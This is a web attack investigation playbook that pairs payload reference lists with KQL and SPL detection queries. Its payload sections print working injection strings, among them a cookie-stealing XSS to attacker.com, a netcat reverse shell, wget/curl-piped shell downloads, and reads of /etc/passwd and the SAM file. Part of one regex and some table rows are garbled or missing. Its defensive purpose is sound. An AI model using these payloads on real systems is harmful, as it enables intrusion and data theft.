Web Application Attack Investigation Playbook

Complete investigation workflow for SQL injection, XSS, command injection, path traversal, and other web application attacks.

Attack Pattern Recognition

SQL Injection Patterns

Common SQLi Payloads
# Authentication bypass
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
admin'--
' OR 1=1#

# UNION-based extraction
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT username,password FROM users--
' UNION SELECT table_name,NULL FROM information_schema.tables--

# Time-based blind SQLi
'; WAITFOR DELAY '0:0:5'--
' AND SLEEP(5)--
' OR IF(1=1, SLEEP(5), 0)--

# Error-based SQLi
' AND 1=CONVERT(int, @@version)--
' AND extractvalue(1, concat(0x7e, version()))--

# Out-of-band SQLi
'; EXEC xp_dirtree '\\attacker.com\share'--

XSS Patterns

Common XSS Payloads
# Basic script injection
<script>alert('XSS')</script>
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>

# Event handlers
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>

# Encoded variants
<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>
<img src=x onerror="alert('XSS')">

# DOM-based XSS
javascript:alert('XSS')
data:text/html,<script>alert('XSS')</script>

Command Injection Patterns

Common Command Injection
# Command separators
; ls -la
| cat /etc/passwd
|| whoami
&& id
`id`
$(whoami)

# Common payloads
; cat /etc/passwd
| nc attacker.com 4444 -e /bin/sh
; wget http://attacker.com/shell.sh | bash
; curl http://attacker.com/shell.sh | sh

# Windows variants
& dir
| type C:\Windows\System32\config\SAM
& net user

Investigation Steps

Step 1: Identify Attack Type and Scope

KQL - WAF/Web Log Analysis (Azure)

// Identify web attacks from WAF logs
AzureDiagnostics
| where ResourceProvider == "MICROSOFT.NETWORK"
| where Category == "ApplicationGatewayFirewallLog"
| where action_s == "Blocked" or action_s == "Detected"
| summarize 
    AttackCount = count(),
    AttackTypes = make_set(ruleSetType_s),
    Rules = make_set(ruleId_s)
    by clientIp_s, requestUri_s, bin(TimeGenerated, 1h)
| where AttackCount > 5
| order by AttackCount desc

KQL - SQL Injection Detection

// Detect SQLi attempts in web logs
AzureDiagnostics
| where TimeGenerated > ago(24h)
| where requestUri_s contains "'" 
    or requestUri_s contains "UNION"
    or requestUri_s contains "SELECT"
    or requestUri_s contains "--"
    or requestUri_s contains "/*"
    or requestUri_s contains "OR 1=1"
    or requestUri_s contains "AND 1=1"
| extend SQLiIndicators = extract_all(@"('|UNION|SELECT|INSERT|UPDATE|DELETE|DROP|--|/\*|\*/|OR\s+1=1|AND\s+1=1|WAITFOR|SLEEP)", requestUri_s)
| where array_length(SQLiIndicators) > 0
| project TimeGenerated, clientIp_s, requestUri_s, SQLiIndicators, httpStatus_s
| order by TimeGenerated desc

KQL - XSS Detection

// Detect XSS attempts
AzureDiagnostics
| where TimeGenerated > ago(24h)
| where requestUri_s contains "<script" 
    or requestUri_s contains "javascript:"
    or requestUri_s contains "onerror="
    or requestUri_s contains "onload="
    or requestUri_s contains "<img"
    or requestUri_s contains "<svg"
| extend XSSIndicators = extract_all(@"( 0
| project TimeGenerated, clientIp_s, requestUri_s, XSSIndicators, httpStatus_s
| order by TimeGenerated desc

Signs of Successful Attack
Attack TypeSuccess IndicatorsWhere to Look

XSSPayload stored and rendered to other usersApplication data, victim browser activity

KQL - Check for Successful Exploitation

// Look for successful attacks (200 responses to attack requests)
let AttackIPs = AzureDiagnostics
| where TimeGenerated > ago(24h)
| where action_s == "Blocked"
| distinct clientIp_s;
// Check if same IPs got 200 responses
AzureDiagnostics
| where TimeGenerated > ago(24h)
| where clientIp_s in (AttackIPs)
| where httpStatus_s == "200"
| summarize 
    SuccessfulRequests = count(),
    URIs = make_set(requestUri_s, 50)
    by clientIp_s
| order by SuccessfulRequests desc

Step 3: Server-Side Impact Assessment

Check for Web Shell Deployment

// KQL - Detect web shell activity
DeviceProcessEvents
| where TimeGenerated > ago(24h)
| where InitiatingProcessFileName in ("w3wp.exe", "httpd", "nginx", "apache2", "php-fpm", "java")
| where FileName in ("cmd.exe", "powershell.exe", "bash", "sh", "python", "perl", "whoami", "net.exe")
| project TimeGenerated, DeviceName, InitiatingProcessFileName, FileName, ProcessCommandLine
| order by TimeGenerated desc

SPL - Suspicious Process from Web Server

index=endpoint sourcetype=sysmon EventCode=1
| where parent_process_name IN ("w3wp.exe", "httpd", "nginx", "apache2", "java.exe")
| where process_name IN ("cmd.exe", "powershell.exe", "bash", "sh", "whoami", "net.exe", "net1.exe")
| table _time, host, parent_process_name, process_name, command_line
| sort -_time

Step 4: Database Impact Assessment (for SQLi)

KQL - Database Query Analysis

// Check for unusual database queries
AzureDiagnostics
| where ResourceProvider == "MICROSOFT.SQL"
| where Category == "SQLSecurityAuditEvents"
| where statement_s contains "UNION" 
    or statement_s contains "information_schema"
    or statement_s contains "sys.tables"
    or statement_s contains "xp_cmdshell"
| project TimeGenerated, client_ip_s, database_name_s, statement_s, succeeded_s
| order by TimeGenerated desc

Check for Data Exfiltration

// Large data transfers after SQL injection
AzureDiagnostics
| where TimeGenerated > ago(24h)
| where clientIp_s == "ATTACKER_IP"
| summarize TotalBytes = sum(toint(sentBytes_s)), RequestCount = count() by bin(TimeGenerated, 5m)
| where TotalBytes > 1000000  // More than 1MB
| order by TimeGenerated asc

Web shell deployed Isolate server, preserve evidence Network isolation, disk snapshot
Database compromised Revoke app DB credentials, assess data access Rotate credentials, enable detailed audit
Vulnerable endpoint identified Apply virtual patch at WAF WAF rule to block specific payload patterns
Scanning activity Rate limit or block scanner WAF rate limiting rule
